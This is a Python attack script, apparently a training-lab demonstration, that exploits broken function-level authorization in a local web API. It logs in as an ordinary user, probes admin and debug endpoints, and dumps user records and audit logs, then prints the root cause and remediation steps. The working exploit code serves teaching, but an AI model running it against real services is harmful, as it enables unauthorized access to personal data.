#!/usr/bin/env python3
"""
Admin Endpoint Access Attack

This script demonstrates how regular users can access admin endpoints
when function-level authorization is not properly implemented.
"""

import requests
import json
import sys

API_URL = "http://localhost:5000"

def print_banner():
    print("=" * 60)
    print("ADMIN ENDPOINT ACCESS ATTACK")
    print("=" * 60)
    print()

def login(username, password):
    """Login and get authentication token."""
    print(f"[*] Logging in as {username}...")
    
    try:
        response = requests.post(
            f"{API_URL}/api/login",
            json={"username": username, "password": password}
        )
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Login successful!")
            print(f"[+] Role: {data['user']['role']}")
            return data.get('token')
        else:
            print(f"[-] Login failed: {response.json()}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

def test_admin_endpoints(token, username):
    """Test access to various admin endpoints."""
    print(f"\n[*] Testing admin endpoints as {username} (regular user)...")
    
    admin_endpoints = [
        ("GET", "/api/admin/users", "List all users with full details"),
        ("GET", "/api/admin/audit-log", "View audit logs"),
        ("GET", "/api/debug/users", "Debug endpoint with password hashes"),
        ("GET", "/api/settings", "System settings"),
    ]
    
    vulnerable_endpoints = []
    
    for method, path, description in admin_endpoints:
        print(f"\n[*] Testing: {method} {path}")
        print(f"    Description: {description}")
        
        try:
            if method == "GET":
                response = requests.get(
                    f"{API_URL}{path}",
                    headers={"Authorization": f"Bearer {token}"}
                )
            
            if response.status_code == 200:
                print(f"[!] VULNERABLE: Endpoint accessible!")
                data = response.json()
                
                if isinstance(data, list):
                    print(f"    Retrieved {len(data)} items")
                elif isinstance(data, dict):
                    print(f"    Retrieved data with {len(data)} fields")
                
                vulnerable_endpoints.append((method, path, description))
            elif response.status_code == 403:
                print(f"[+] SECURE: Access denied (403)")
            elif response.status_code == 404:
                print(f"[-] Endpoint not found (404)")
            else:
                print(f"[-] Unexpected status: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
    
    return vulnerable_endpoints

def exploit_admin_users(token):
    """Demonstrate data exfiltration from admin endpoint."""
    print("\n[*] Attempting to exfiltrate user data...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/admin/users",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            users = response.json()
            print(f"[+] Successfully retrieved {len(users)} users!")
            print("\n[+] Sensitive data exposed:")
            
            for user in users:
                print(f"\n    User ID: {user.get('id')}")
                print(f"    Username: {user.get('username')}")
                print(f"    Email: {user.get('email')}")
                print(f"    Role: {user.get('role')}")
                print(f"    Created: {user.get('created_at')}")
            
            return True
        else:
            print(f"[-] Access denied: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def exploit_audit_log(token):
    """Demonstrate audit log access."""
    print("\n[*] Attempting to access audit log...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/admin/audit-log",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            logs = response.json()
            print(f"[+] Successfully retrieved {len(logs)} audit log entries!")
            
            if logs:
                print("\n[+] Recent audit entries:")
                for log in logs[-5:]:  # Show last 5 entries
                    print(f"\n    Timestamp: {log.get('timestamp')}")
                    print(f"    Action: {log.get('action')}")
                    print(f"    Actor: {log.get('actor')}")
                    if 'target' in log:
                        print(f"    Target: {log.get('target')}")
            
            return True
        else:
            print(f"[-] Access denied: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    print_banner()
    
    # Check API availability
    try:
        response = requests.get(f"{API_URL}/api/health")
        if response.status_code != 200:
            print("[-] API is not responding correctly")
            sys.exit(1)
    except requests.exceptions.RequestException:
        print(f"[-] Cannot connect to API at {API_URL}")
        sys.exit(1)
    
    # Login as regular user
    token = login("alice", "password123")
    
    if not token:
        print("[-] Failed to login")
        sys.exit(1)
    
    # Test admin endpoints
    vulnerable = test_admin_endpoints(token, "alice")
    
    if vulnerable:
        print("\n" + "=" * 60)
        print("VULNERABLE ENDPOINTS FOUND!")
        print("=" * 60)
        
        for method, path, desc in vulnerable:
            print(f"  {method} {path}")
            print(f"    → {desc}")
        
        # Demonstrate exploitation
        print("\n" + "=" * 60)
        print("DEMONSTRATING EXPLOITATION")
        print("=" * 60)
        
        exploit_admin_users(token)
        exploit_audit_log(token)
        
        print("\n" + "=" * 60)
        print("ATTACK SUMMARY")
        print("=" * 60)
        print(f"\nVulnerability: Broken Function Level Authorization")
        print(f"Vulnerable Endpoints: {len(vulnerable)}")
        print(f"\nRoot Cause:")
        print(f"  - Endpoints check authentication (login) only")
        print(f"  - Missing authorization checks (role verification)")
        print(f"  - Admin functions accessible to all authenticated users")
        print(f"\nImpact:")
        print(f"  - Data breach (PII exposure)")
        print(f"  - Audit log tampering knowledge")
        print(f"  - Information for further attacks")
        print(f"\nRemediation:")
        print(f"  1. Add @admin_required decorator to admin endpoints")
        print(f"  2. Implement role-based access control (RBAC)")
        print(f"  3. Use before_request middleware for path-based checks")
        print(f"  4. Remove debug endpoints from production")
        print("=" * 60)
    else:
        print("\n[+] No vulnerable endpoints found")
        print("[+] Authorization is properly implemented")

if __name__ == "__main__":
    main()
